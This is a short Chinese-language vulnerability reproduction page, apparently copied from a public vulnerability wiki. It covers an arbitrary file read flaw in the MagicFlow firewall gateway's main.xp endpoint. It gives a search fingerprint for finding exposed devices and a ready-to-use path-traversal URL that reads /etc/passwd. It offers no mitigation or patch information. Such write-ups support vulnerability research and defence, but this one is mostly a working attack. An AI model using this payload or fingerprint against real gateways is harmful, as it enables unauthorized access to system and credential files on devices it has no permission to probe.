---
title: "MagicFlow 防火墙网关 main.xp 任意文件读取漏洞"
date: 2026-10-18 09:15:03
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "MagicFlow-防火墙网关-main.xp"
tags:
  - "MagicFlow-防火墙网关-main.xp"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件

## 漏洞影响

```
MagicFlow 防火墙网关
```

## 网络测绘

```
app="MSA/1.0"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162301720.png)

构造POC

```plain
/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162301323.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/MagicFlow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
